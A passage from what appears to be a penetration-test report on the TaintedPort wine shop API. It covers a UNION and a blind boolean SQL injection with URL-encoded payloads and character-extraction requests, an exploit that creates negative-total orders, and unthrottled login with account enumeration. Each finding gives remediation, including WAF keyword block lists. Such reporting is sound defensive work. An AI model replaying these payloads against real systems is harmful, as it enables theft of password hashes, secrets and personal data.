HTTP/1.1 200 OK

{"success":true,"wine":{"id":478,"name":"Validator20 PoC","region":"validator20+poc1784548486@example.com","type":"$2y$10$hjYb75P1qoRG2fuH00REReP/A9IYngmpM.aoypnj3Y6nWNmGQlMiu","vintage":0,"price":0,"image_url":7,"description":8,...,"created_at":"2026-07-20 11:54:46"}}
```


> The real bcrypt hash of the throwaway account is returned inside the JSON wine object via the wine-lookup endpoint — arbitrary read of the `users` table is proven.



**9. Sibling endpoint /wines/{id}/reviews — boolean oracle**

*Request:*
```http
GET /wines/1%20AND%205=6/reviews HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"reviews":[],"avg_rating":0,"review_count":0}
```


> Compared with GET /wines/1%20AND%202=2/reviews which returns the real review list — same numeric-context SQL injection is present on this handler too.





#### Remediation

1. **Integer-cast and parameterise the path parameter in the wine-lookup handler.** Both defences must be in place; the cast alone neutralises this specific attack, parameterisation is the required baseline.

```php
$id = (int) $id;
$stmt = $pdo->prepare('SELECT * FROM wines WHERE id = :id LIMIT 1');
$stmt->execute([':id' => $id]);
```

2. **Apply the identical fix to `GET /wines/{id}/reviews`** (same root cause, same numeric context).
3. **Validate every numeric path segment at the routing layer** with a regex constraint (`/^\d+$/`) so anything non-numeric returns 404 before it ever reaches the handler.
4. **Audit the whole codebase** for other raw SQL string interpolation. Enforce a repository/DAO layer that only exposes parameterised methods; ban string concatenation of user input into SQL in code review.
5. **Rotate secrets treated as compromised** — force a password reset for every user (bcrypt is unbroken but the hashes must be treated as exposed), rotate every stored `totp_secret` (they are stored in cleartext), and rotate the JWT HS256 signing key so any tokens minted via chained exploitation are invalidated.
6. **Add WAF/regression rules** — block requests to `/wines/*` containing `UNION`, `SELECT`, or ` AND ` in the path (defence in depth). Add integration tests: `GET /wines/1 AND 1=2` and `GET /wines/-1 UNION SELECT ...` must both return 404.
7. **Enable query logging in the DB and alerting** on anomalous SELECTs from the web user (e.g. queries containing `sqlite_master` or `password_hash`).

---


### vuln-0017: Unauthenticated Blind Boolean-Based SQL Injection in GET /wines `search` Parameter










**Severity:** HIGH | **CVSS:** 7.5 | **Endpoint:** `/wines` | **Method:** GET | **CWE:** CWE-89 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

#### Description

The `search` query parameter of `GET /wines` on `api.taintedport.com` is interpolated verbatim into multiple `LIKE '%<input>%'` fragments of the wine-search SQL. An unauthenticated attacker can inject the payload `Zzz%' OR (<PRED>) AND '%'='`, which closes each `LIKE` literal, injects an arbitrary boolean predicate `<PRED>`, and re-opens the trailing `%'` appended by the server. Because AND binds tighter than OR and `'%'='%'` is trivially TRUE, the whole reconstructed WHERE reduces to the value of `<PRED>`, producing a clean two-state oracle: total=24 for TRUE and total=0 for FALSE. That oracle enables blind character-by-character extraction of any value in the SQLite database (users, orders, reviews, cart_items, etc.).


#### Attack Flow

```
┌────────────────────────────────────────────────────────────────────┐
│  Blind Boolean SQL Injection — GET /wines?search=<PAYLOAD>         │
└────────────────────────────────────────────────────────────────────┘

  Prerequisites:  network reach to api.taintedport.com (no auth)
  Root cause  :   raw string interpolation of ?search into multiple
                  LIKE '%<input>%' fragments joined by OR

┌────────────┐            ┌────────────────────────────────────────┐
│  Attacker  │            │              api.taintedport.com       │
│  (unauth)  │            │  ┌──────────────────────────────────┐  │
└─────┬──────┘            │  │      /wines handler              │  │
      │                   │  │  SELECT ... FROM wines WHERE     │  │
      │                   │  │    name   LIKE '%<INPUT>%'  OR   │  │
      │                   │  │    region LIKE '%<INPUT>%'  OR   │  │
      │                   │  │    type   LIKE '%<INPUT>%'       │  │
      │                   │  └──────────────────────────────────┘  │
      │                   └───────────────┬────────────────────────┘
      │                                   │
      │ ── (1) baseline ─────────────────▶│    total = 0
      │    search=Zzz                     │
      │                                   │
      │ ── (2) TRUE oracle ──────────────▶│    total = 24
      │    search=Zzz%' OR (1=1) AND '%'='│
      │                                   │
      │       WHERE evaluates to:         │
      │       LIKE '%Zzz%'                │
      │         OR (1=1) AND '%'='%'      │  ◀── AND binds tighter
      │         OR LIKE '%Zzz%'           │      than OR; '%'='%' is
      │         OR (1=1) AND '%'='%'      │      trivially TRUE
      │                                   │
      │ ── (3) FALSE oracle ─────────────▶│    total = 0
      │    search=Zzz%' OR (1=2) AND '%'='│
      │                                   │
      │                        ┌──────────┴──────────┐
      │                        │  TWO-STATE ORACLE   │
      │                        │  TRUE  → total=24   │
      │                        │  FALSE → total=0    │
      │                        └──────────┬──────────┘
      │                                   │
      │ ── (4) char oracle ──────────────▶│
      │    ...OR (unicode(substr(         │    binary search
      │       sqlite_version(),i,1))<=M)  │    over M ∈ [32..126]
      │       AND '%'='                   │
      │                                   │    ~7 requests / byte
      │                                   │
      │ ── (5) extract group_concat(name) │
      │    FROM sqlite_master ───────────▶│
      │                                   │
      │◀── users, sqlite_sequence, wines, │
      │    cart_items, orders,            │
      │    order_items, reviews           │
      │                                   │
      │                                   ▼
      │          ┌────────────────────────────────────┐
      │          │  Same primitive → arbitrary blind  │
      │          │  reads over the full SQLite DB:    │
      │          │  • users.password_hash (bcrypt)    │
      │          │  • users.totp_secret / tokens      │
      │          │  • orders / order_items / reviews  │
      │          │  • any PII column                  │
      │          └────────────────────────────────────┘
      ▼
   No auth, no rate-limit → covert low-and-slow exfiltration channel.
```


#### Impact

An unauthenticated attacker with only network reach to the API obtains a reliable, low-noise blind read primitive over the entire SQLite backend. Confirmed reachable tables include `users` (password hashes, TOTP/2FA secrets, PII), `orders`, `order_items`, `reviews`, and `cart_items`. Character-by-character extraction costs ~7 requests per byte via binary search, so a single 60-byte bcrypt hash can be recovered in ~420 requests — well within what a slow, undetected scraper can achieve. Because the endpoint is public, returns JSON, and no rate-limiting was observed, an attacker can dump every user credential and PII field without ever authenticating. Even if louder SQLi paths on the same application (e.g. UNION-based injection on `/wines/{id}`) are fixed, this endpoint remains a covert, low-and-slow exfiltration channel to the same data. Confidentiality impact: HIGH. Integrity/availability impact: NONE (no evidence of stacked queries or writeable statements at this injection point).

#### Technical Analysis

Attack surface / reflection: `GET /wines?search=abc` returns `{"success":true,"wines":[…],"total":N,"search_query":"abc",…}`. The value is echoed and used in a server-side LIKE filter against multiple columns (empirically 2–3 occurrences — likely `name`, `region`, and/or `type`) joined by OR.

Injection template: `Zzz%' OR (<PRED>) AND '%'='`

Applied to a server WHERE that looks like `... LIKE '%<INPUT>%' OR ... LIKE '%<INPUT>%'` this yields, after the server appends its own trailing `%'`:

    ... LIKE '%Zzz%' OR (<PRED>) AND '%'='%' OR ... LIKE '%Zzz%' OR (<PRED>) AND '%'='%'

With standard SQL precedence (AND > OR) and `'%'='%'` trivially TRUE, this reduces to `<PRED>`. Verified two-state oracle:

  - `Zzz%' OR (1=1) AND '%'='`  → total = 24
  - `Zzz%' OR (1=2) AND '%'='`  → total = 0
  - `Zzz`                       → total = 0  (baseline)

SQLite fingerprint via character oracle:

  - `unicode(substr(sqlite_version(),1,1))=51` → total=24  (char '3')
  - `unicode(substr(sqlite_version(),2,1))=46` → total=24  (char '.')
  - full binary-search extraction of `sqlite_version()` returned `3.51.2`.

Table enumeration via binary search:

  `(select group_concat(name) from sqlite_master where type='table')`
  → `users,sqlite_sequence,wines,cart_items,orders,order_items,reviews`

Constraints observed:
- Standard `--` comment terminators cause an unbalanced-quote error (HTTP 500) because of the multi-LIKE context; the `'%'='` closing motif is required to keep quotes balanced across all occurrences.
- Payloads containing single-quoted string literals (e.g. `substr(x,1,1)='3'`) similarly break quote balance; `unicode()` + numeric comparisons or hex/int literals must be used instead.

Root cause: raw string interpolation of the `search` query parameter into multiple LIKE fragments in the wine-search SQL, with no parameterisation and no output-shape hardening (row count is directly attacker-controllable via injected boolean).


#### Proof of Concept


Fully unauthenticated. All requests are simple GETs against `https://api.taintedport.com/wines`.

1. Baseline (harmless value):
   `GET /wines?search=Zzz`  → `{"total":0,…}`

2. TRUE oracle (injected `1=1` reduces WHERE to TRUE):
   `GET /wines?search=Zzz%25%27+OR+%281%3D1%29+AND+%27%25%27%3D%27`
   → `{"total":24,…}`

3. FALSE oracle (injected `1=2`):
   `GET /wines?search=Zzz%25%27+OR+%281%3D2%29+AND+%27%25%27%3D%27`
   → `{"total":0,…}`

4. Character-level fingerprint (SQLite version, byte 1 == '3'):
   `GET /wines?search=Zzz%25%27+OR+%28unicode%28substr%28sqlite_version%28%29%2C1%2C1%29%29%3D51%29+AND+%27%25%27%3D%27`
   → `{"total":24,…}`

5. Automated table enumeration (see `poc.py`): binary-searches every character of
   `(select group_concat(name) from sqlite_master where type='table')` using
   `unicode(substr(...,i,1))<=MID` as the boolean predicate and terminates via a
   length check. Result recovered by the PoC:
   `users,sqlite_sequence,wines,cart_items,orders,order_items,reviews`.

Run `python3 poc/poc.py --no-pause` for a self-contained demonstration that prints the extracted `sqlite_version()` (`3.51.2`) and the full table list.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Baseline — search for a value that does not exist**

*Request:*
```http
GET /wines?search=Zzz HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[],"total":0,"search_query":"Zzz","message":"Showing results for: Zzz"}
```


> Establishes that a non-matching literal search returns 0 rows. This is the reference point for the oracle.



**2. TRUE oracle — inject predicate (1=1)**

*Request:*
```http
GET /wines?search=Zzz%25%27+OR+%281%3D1%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[/* 24 items */],"total":24,"search_query":"Zzz%' OR (1=1) AND '%'='","message":"Showing results for: Zzz%' OR (1=1) AND '%'='"}
```


> The same literal 'Zzz' that returned 0 above now returns the entire catalog (24 rows) because the injected boolean forces the WHERE clause to TRUE. The verbatim payload also appears in `search_query` in the response — direct evidence of raw interpolation.



**3. FALSE oracle — inject predicate (1=2)**

*Request:*
```http
GET /wines?search=Zzz%25%27+OR+%281%3D2%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[],"total":0,"search_query":"Zzz%' OR (1=2) AND '%'='"}
```


> Same request shape, only the injected boolean flipped to FALSE — total collapses back to 0. This is the second half of the two-state oracle.



**4. Character oracle — sqlite_version() byte 1 == '3'**

*Request:*
```http
GET /wines?search=Zzz%25%27+OR+%28unicode%28substr%28sqlite_version%28%29%2C1%2C1%29%29%3D51%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[/* 24 items */],"total":24,"search_query":"Zzz%' OR (unicode(substr(sqlite_version(),1,1))=51) AND '%'='"}
```


> Injects a SQLite-specific expression comparing the first character of sqlite_version() to 51 ('3'). total=24 confirms TRUE, giving a per-character read primitive. Binary-search extraction over positions 1..6 returns '3.51.2'.



**5. Table enumeration — value recovered by binary-search PoC**

*Request:*
```http
GET /wines?search=Zzz%25%27+OR+%28unicode%28substr%28%28select+group_concat%28name%29+from+sqlite_master+where+type%3D%27table%27%29%2C{i}%2C1%29%29%3C%3D{mid}%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com

(repeated for i=1..N and adaptive mid — see poc.py)
```

*Response:*
```http
Extracted value from ~7 requests/byte:

users,sqlite_sequence,wines,cart_items,orders,order_items,reviews
```


> The oracle is used with unicode(substr(...))<=MID to binary-search each character of arbitrary SQL string expressions. The recovered value confirms full access to sqlite_master and, by extension, to every application table (including `users` — password hashes, TOTP secrets, PII).





#### Remediation

1. Replace the raw string interpolation in the wine-search handler with a parameterised prepared statement. Build the LIKE needle in code and bind it as a single parameter, e.g.:

       $needle = '%' . $search . '%';
       $stmt = $db->prepare(
         'SELECT ... FROM wines
          WHERE name LIKE :q OR region LIKE :q OR type LIKE :q');
       $stmt->execute([':q' => $needle]);

   PDO/SQLite will escape quotes and wildcards inside the bound value.

2. If literal `%` and `_` in user input must be treated as characters (not wildcards), escape them before binding and use `LIKE :q ESCAPE '\'`:

       $safe = str_replace(['\\','%','_'], ['\\\\','\\%','\\_'], $search);

3. Audit every other handler that concatenates request data into SQL. Introduce a repository/DAO layer that forbids raw SQL string interpolation, and add a lint rule (e.g. semgrep) to detect regressions.

4. Add defence-in-depth: block obvious SQLi metacharacter patterns (`' OR `, `--`, `union select`, `sqlite_master`, `sleep(`, `benchmark(`, etc.) in the `search` parameter at the WAF/edge, and apply per-IP rate limits to `/wines` to raise the cost of blind extraction.

5. Add a regression test asserting that `GET /wines?search=Zzz%25%27+OR+%281%3D1%29+AND+%27%25%27%3D%27` returns `total:0` (i.e. treats the payload as a literal search string) once fixed. The provided `verify.py` may be reused as a CI check.

6. Because this endpoint gives a covert channel to the same DB as the sibling UNION SQLi on `/wines/{id}`, fix all SQLi surfaces in a single deployment — patching only the louder one does not remove the risk to the data.

---


### vuln-0010: Business Logic: Authenticated user can create durable orders with negative totals via unbounded PUT /cart/update combined with negative-priced catalog items










**Severity:** MEDIUM | **CVSS:** 6.5 | **Endpoint:** `/orders` | **Method:** POST | **CWE:** CWE-840 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`

#### Description

The TaintedPort ordering flow (`POST /orders`) does not enforce a lower bound of zero on the derived order total before durably persisting the order row. Combined with two supporting weaknesses — (a) the wine catalog contains items with negative unit prices (e.g. `wine_id=8` "Quinta do Crasto Reserva Old Vines" at `price=-9999`, `wine_id=17` at `-7777`, `wine_id=7` at `-5000`, plus five other wines with negative prices), and (b) `PUT /cart/update` performs neither a lower nor an upper bound check on the `quantity` field — any authenticated user can force the server-computed cart total to an arbitrarily large negative number and check out. The resulting order is stored in `pending` status with the negative total intact and enters the normal fulfillment pipeline. Because the shop is cash-on-delivery (no payment step in the ordering flow), a stored negative total represents a contractual obligation on the merchant to pay the buyer that amount on delivery.

Positively verified during validation:
- `POST /cart/add` correctly rejects `quantity` outside 1..12 (HTTP 400 "Quantity must be between 1 and 12.").
- `PUT /cart/update` accepts `quantity=500` (validation), and previously the tester confirmed values of `-3`, `0`, `999`, `99999`, `1000`, and `2147483647` are all accepted with no error.
- Client-supplied `total` and `status` fields in the `POST /orders` body ARE ignored server-side (verified: sending `"total":99999,"status":"delivered"` produced a stored row with `total=-2499999,status="pending"`). The vulnerability is not mass-assignment on those fields; it is the absence of a `total>=0` invariant check on the server-computed value.

Order `#140` was created live during validation with `total=-2499999,status=pending`, and a second identical run via `verify.py` created `#141` with `total=-2500000,status=pending`.


#### Attack Flow

```
┌────────────────────────────────────────────────────────────────────────────┐
│  NEGATIVE-TOTAL ORDER via unbounded PUT /cart/update + negative-price seed │
└────────────────────────────────────────────────────────────────────────────┘

Prerequisites
  • Any self-registered authenticated user (PR:L, no admin)
  • >=1 wine with price < 0 in the catalog (8 present: ids 3, 5, 6, 7, 8, 10, 11, 17)

  Attacker (any user)                       api.taintedport.com
  -------------------                       ---------------------
                                                    │
   (1) POST /auth/login  ──────────────────────────►│
       { email, password }                          │
                                            ◄───────┤  200 { token: eyJ... }
                                                    │
   (2) GET /wines  ────────────────────────────────►│
                                            ◄───────┤  wine_id=7  price=-5000
                                                    │  wine_id=8  price=-9999   [seed]
                                                    │
   (3) POST /cart/add  ────────────────────────────►│
       { wine_id:7, quantity:1 }                    │  Guard: qty in [1..12] OK
                                            ◄───────┤  200 ok
                                                    │
   (4) POST /cart/add   { qty:100 } ───────────────►│  Guard: qty in [1..12] OK
                                            ◄───────┤  400  "Quantity must be
                                                    │         between 1 and 12."
                                                    │        (control sample)
                                                    │
   (5) PUT /cart/update  ──────────────────────────►│  ┌──────────────────────┐
       { wine_id:7, quantity:500 }                  │  │ GAP #1: NO qty check │
                                            ◄───────┤  └──────────────────────┘
                                                    │  200 "Cart updated"
                                                    │
   (6) GET /cart  ─────────────────────────────────►│
                                            ◄───────┤  subtotal = -2,500,000
                                                    │  total    = -2,499,999   [X]
                                                    │
   (7) POST /orders                                 │  ┌────────────────────────┐
       { shipping_address, delivery_notes,          │  │ GAP #2: total<0        │
         total:99999,        <-- ignored (ok)       │  │ invariant NOT checked  │
         status:"delivered"  <-- ignored (ok) ─────►│  └────────────────────────┘
       }                                            │  server recomputes total
                                                    │  writes orders row
                                            ◄───────┤  201 { order_id:140 }
                                                    │
   (8) GET /orders/140  ───────────────────────────►│
                                            ◄───────┤  { id:140,
                                                    │    total:-2499999,
                                                    │    status:"pending", ...}  [durable]

  ┌──────────────────────────────────────────────────────────────────────────┐
  │  Downstream impact (cash on delivery):                                   │
  │  order_id=140 enters normal fulfillment queue in "pending" status;       │
  │  the merchant's ledger indicates it owes |−2,499,999| to the buyer.      │
  └──────────────────────────────────────────────────────────────────────────┘

  Root cause
  ----------
  "orders.total >= 0" invariant enforced in NEITHER
    (a) POST /orders application code, NOR
    (b) DB CHECK constraint on orders.total,
  AND cart-line qty validation exists on POST /cart/add but is missing from
  the sibling PUT /cart/update mutation path (defence-in-depth failure).
```


#### Impact

Direct financial and reputational impact on the merchant with no privilege escalation required.

- Any authenticated user (self-registration exists) can create durable `pending` orders with negative totals; there is no rate limit, no admin review gate, and no payment authorization step between placement and the standard order pipeline.
- In cash-on-delivery mode, every unit fulfilled against a negative-total order is a delivery of goods for which the merchant's ledger indicates the customer is owed money. If downstream ledgering, refund flows, partner settlement or accounting reconciliation are driven off the `orders.total` column, each such order silently corrupts financial state by up to the full magnitude of the total.
- The negative amount is bounded only by the product of the most negative catalog price and the largest accepted integer quantity. The tester demonstrated `qty=2147483647` was accepted by `PUT /cart/update`, so a single order can push the ledger to below `-21 trillion` (INT32_MAX × -9999). Validation was performed at a conservative `qty=500`, which is already unambiguously damaging (−2,499,999 per order).
- Because the same durable row is exposed to normal downstream consumers (fulfillment, admin views, reporting), the corruption is silent — there is no "negative order" branch to alert on.

The finding is a clear violation of a fundamental business invariant ("orders always represent a debt owed by the buyer to the merchant") and results in Integrity: High for financial data.

#### Technical Analysis

Two independent server-side control gaps combine to break the "order total is a non-negative amount owed to the merchant" invariant:

1. **`PUT /cart/update` performs no bounds validation on `quantity`.** The endpoint accepts any signed integer without rejecting values below 1 or above the per-line ceiling that `POST /cart/add` enforces. Confirmed accepted values include `500` (validation), `-3` and `0` (tester — both silently remove the row), `999`, `1000`, `99999`, and `2147483647`. The presence of a strict `1..12` bound on `POST /cart/add` (verified — HTTP 400 "Quantity must be between 1 and 12.") establishes that the developer knew the invariant but only enforced it on one of the two write paths.

2. **`POST /orders` does not enforce `total >= 0`.** The endpoint correctly recomputes `total = sum(item.price * item.quantity)` from the current server-side cart state and correctly ignores client-supplied `total` / `status` fields in the request body (verified — no mass-assignment on those fields). However, before writing the `orders` row it does not defensively assert that the computed total is non-negative. As a result any cart whose current subtotal is negative — which is trivially reachable given #1 and negative-priced seed data — becomes a durable order in `pending` status.

**Auxiliary:** the wine catalog contains eight items with `price < 0` at the time of testing (`ids 3, 5, 6, 7, 8, 10, 11, 17`). Whether this is intended demo data or a seeding accident, the checkout code path must not rely on their absence to preserve the total invariant. A per-line negative quantity on a positive-priced wine via `PUT /cart/update` would produce the same negative subtotal even in the absence of negative-priced products.

**Root cause:** the "order total is non-negative" business invariant is enforced neither by a database `CHECK` constraint on `orders.total` (and `cart_items.quantity`) nor by an application-layer guard in the checkout code path. The `1..12` cart-line quantity check exists in only one of the two mutation endpoints.

**Absence of mass-assignment:** it is worth explicitly noting that `POST /orders` correctly ignores `total` and `status` fields sent in the request body. The finding is not a mass-assignment finding — it is an invariant / business-logic finding on the server-computed value.


#### Proof of Concept


Prerequisites: an authenticated user (self-registration is available). No special role, no admin credentials, no opaque identifiers required. Reproduces reliably against the live API.

1. Authenticate: `POST /auth/login` with any valid credentials → obtain Bearer JWT.
2. `GET /wines?limit=100` — confirm the target catalog still contains at least one wine with `price < 0` (validation observed 8 such wines: ids 3, 5, 6, 7, 8, 10, 11, 17).
3. Empty the cart by iterating `DELETE /cart/remove/{wine_id}` over any existing lines.
4. `POST /cart/add` body `{"wine_id":7,"quantity":1}` → 200 OK. (Confirming that the per-add cap remains: `POST /cart/add {"wine_id":7,"quantity":100}` returns HTTP 400 "Quantity must be between 1 and 12.")
5. `PUT /cart/update` body `{"wine_id":7,"quantity":500}` → 200 OK `{"success":true,"message":"Cart updated"}` — **the amplification step: this endpoint enforces no bound.**
6. `GET /cart` → `{"items":[{"wine_id":7,"price":-5000,"quantity":500,"subtotal":-2500000}], "total":-2499999}`.
7. `POST /orders` with any valid shipping_address (optionally including `"total":99999,"status":"delivered"` to demonstrate that those fields are ignored) → HTTP 201 `{"success":true,"order_id":140,"message":"Order placed successfully"}`.
8. `GET /orders/140` → durable `{"id":140,"user_id":373,"total":-2499999,"status":"pending", …}`.

Live observations during validation: order_id=140 (this validation), order_id=141 (via `verify.py`), order_id=142 (via `poc.py` non-interactive run). See `poc/poc.py` (rich, human-facing) and `poc/verify.py` (regression check, greppable `[VULNERABLE]` / `[NOT VULNERABLE]` verdict).



*The full exploit script is available in the annexes.*




#### Evidence


**1. Authenticate as low-privileged user**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"***"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJ...","user":{"id":373,"is_admin":false}}
```


> Obtain a Bearer JWT for a normal, self-registerable user. No admin role required.



**2. Confirm catalog contains negative-priced wines**

*Request:*
```http
GET /wines?limit=100 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"wines":[..., {"id":7,"name":"Esporao Reserva Tinto","price":-5000, ...}, {"id":8,"name":"Quinta do Crasto Reserva Old Vines","price":-9999, ...}, {"id":17,"name":"Blandy's 10 Year Malmsey Madeira","price":-7777, ...}, ...]}
```


> Eight wines in the seed catalog carry negative unit prices (ids 3, 5, 6, 7, 8, 10, 11, 17). They are user-facing and addable to carts like any other product.



**3. POST /cart/add enforces per-add cap (control sample)**

*Request:*
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"wine_id":7,"quantity":100}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"Quantity must be between 1 and 12."}
```


> Sanity check: the ADD endpoint DOES validate 1<=quantity<=12. Any assumption that a similar guard exists on the UPDATE endpoint would be misplaced.



**4. POST /cart/add with quantity=1 (seed the cart line)**

*Request:*
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"wine_id":7,"quantity":1}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Item added to cart"}
```


> Add one unit of a negative-priced wine (Esporao Reserva Tinto, price=-5000).



**5. PUT /cart/update amplifies quantity WITHOUT any bounds check — root cause #1**

*Request:*
```http
PUT /cart/update HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"wine_id":7,"quantity":500}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Cart updated"}
```


> The UPDATE path silently accepts quantities that ADD would refuse. Tester also confirmed qty=2147483647 (INT32 max) and negative quantities are accepted here.



**6. GET /cart — server-computed total is negative**

*Request:*
```http
GET /cart HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"items":[{"id":377,"wine_id":7,"wine_name":"Esporao Reserva Tinto","price":-5000,"quantity":500,"subtotal":-2500000}],"total":-2499999}
```


> Server computes total as sum(price*quantity). It correctly reflects the cart state — but nothing rejects the negative aggregate.



**7. POST /orders — checkout accepts the negative-total cart (root cause #2)**

*Request:*
```http
POST /orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"shipping_address":{"name":"Validator","street":"Test St","city":"Lx","postal_code":"1000-000","phone":"+351000000000"},"delivery_notes":"validator-10 PoC","total":99999,"status":"delivered"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"order_id":140,"message":"Order placed successfully"}
```


> Order created despite negative total. Client-supplied 'total' and 'status' fields in the body are attempts at mass-assignment; they are (correctly) ignored server-side — confirmed by the response below.



**8. GET /orders/140 — durable persisted order with negative total**

*Request:*
```http
GET /orders/140 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":140,"user_id":373,"total":-2499999,"status":"pending","shipping_name":"Validator","items":[{"wine_id":7,"price":-5000,"quantity":500,"subtotal":-2500000}]}}
```


> Order is durably persisted with total=-2,499,999 in 'pending' status. Server ignored client-supplied 'total':99999 and 'status':'delivered' (confirming no mass-assignment on those fields) but did not enforce total>=0. In TaintedPort's cash-on-delivery model this row represents a merchant obligation to pay the buyer |total| on delivery.





#### Remediation

Apply defence-in-depth — each layer below independently prevents this class of failure:

1. **Enforce the invariant at checkout.** In the `POST /orders` handler, immediately after computing `total = sum(item.price * item.quantity)` and before inserting the `orders` row, assert `total > 0` (or at minimum `total >= 0`). Reject with HTTP 400 and a clear message otherwise. Add an equivalent guard so that no individual `subtotal` can be negative.

2. **Fix `PUT /cart/update` to apply the same input validation `POST /cart/add` already uses.** Reject non-integers, non-positives, and values above the per-line ceiling (currently `1..12`). Ensure the validator is invoked on every mutation path — extract the check into a shared helper and reference it from both endpoints.

3. **Enforce the invariants at the database layer.** Add `CHECK (quantity BETWEEN 1 AND 12)` on `cart_items.quantity` and `CHECK (total >= 0)` on `orders.total`. This ensures no future code path can violate the invariant regardless of application logic.

4. **Sanitize the catalog.** No production wine row should have `price < 0`. Either delete the offending seed rows (ids 3, 5, 6, 7, 8, 10, 11, 17 at the time of testing), mark them `is_active = false`, or add `WHERE price > 0` to all catalog queries and to the "wine addable to cart" query so negative-priced items cannot be placed on a cart in the first place.

5. **Add regression tests.** Integration tests must assert (a) `POST /orders` returns 4xx when the derived total is non-positive, (b) `PUT /cart/update` returns the same 4xx as `POST /cart/add` for `quantity < 1`, `quantity > 12`, non-integer, missing, and negative values, and (c) no order row can be inserted with `total < 0`.

6. **Detective control.** Add an alert on any order row with `total <= 0` to catch invariant violations in production immediately.

---


### vuln-0020: Missing Anti-Automation on /auth/login Combined with Account Enumeration via Timing and Registration Oracles










**Severity:** MEDIUM | **CVSS:** 6.5 | **Endpoint:** `/auth/login` | **Method:** POST | **CWE:** CWE-307 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`

#### Description

The authentication surface at `https://api.taintedport.com/auth/*` exposes two independent weaknesses that combine to enable credential stuffing and targeted password guessing.

1. **`POST /auth/login` has no anti-automation controls.** Thirty consecutive failed login attempts against a real account from the same client IP completed in ~5.5 seconds (5.4 req/s). Every response was HTTP 401 with an identical body, no progressive delay, no lockout, no CAPTCHA, and no HTTP 429/423. Immediately after the burst the correct credential still authenticated (HTTP 200), so the account is not locked. Cloudflare fronts the host but did not present a challenge.

2. **Two orthogonal account-enumeration oracles are present.**
   - **Timing oracle on `POST /auth/login`.** Valid emails take ~1.65× longer than invalid ones because bcrypt password verification runs only when the account row exists. Fifteen interleaved samples measured medians of 180 ms (valid) vs 108 ms (invalid) — a 72 ms delta clearly distinguishable over a WAN.
   - **Registration oracle on `POST /auth/register`.** Existing accounts return HTTP 409 with the exact string `"Email already registered."`; fresh addresses return HTTP 201 with a bearer token. No authentication required.

Combined, an unauthenticated attacker can (a) enumerate which emails from an arbitrary candidate list are real accounts (via either oracle), then (b) run credential-stuffing or dictionary attacks against those confirmed accounts at ~5 requests/second per source with no throttling, blocking, or challenge.


#### Attack Flow

```
┌────────────────────────────────────────────────────────────────────┐
│  ATTACK FLOW — Enumeration + Credential Stuffing on /auth          │
│  Prerequisites: none (unauthenticated attacker, network access)    │
└────────────────────────────────────────────────────────────────────┘

  ┌──────────┐                                    ┌────────────────────┐
  │ Attacker │                                    │  api.taintedport   │
  └────┬─────┘                                    │       .com         │
       │                                          └─────────┬──────────┘
       │  Phase 1 — Enumerate real accounts                 │
       │  (choose either oracle; both work unauth)          │
       │                                                    │
       │ ─── POST /auth/register {email: candidate} ──────► │  409 "Email already
       │                                                    │       registered." (exists)
       │                                                    │  201 + JWT           (fresh)
       │ ◄──────────────────── one-bit answer ─────────────│
       │                                                    │
       │       — OR (silent) —                              │
       │                                                    │
       │ ─── POST /auth/login  {email: candidate, pw:x} ──► │  ~180 ms if exists
       │                                                    │  ~108 ms if not
       │ ◄────── timing delta ~72 ms (bcrypt oracle) ──────│
       │                                                    │
       │  Phase 2 — Filter to a list of confirmed accounts  │
       │            (no rate limit anywhere so far)         │
       │                                                    │
       │  Phase 3 — Credential stuffing                     │
       │                                                    │
       │  for each (email, pw) in leaked_dump:              │
       │ ─── POST /auth/login {email, pw} ─────────────────►│  401 or 200
       │ ◄─── HTTP 401  (no 429, no lockout, no CAPTCHA) ──│
       │      ...30 fails in 5.5 s, then the 31st works... │
       │                                                    │
       │  Phase 4 — Account takeover                        │
       │ ─── POST /auth/login {email, correct_pw} ─────────►│
       │ ◄─────── HTTP 200 {"token": "eyJ..."} ────────────│
       │                                                    │
       ▼                                                    ▼
  Attacker holds a valid JWT for the victim.       No side-effect on
                                                    victim's account
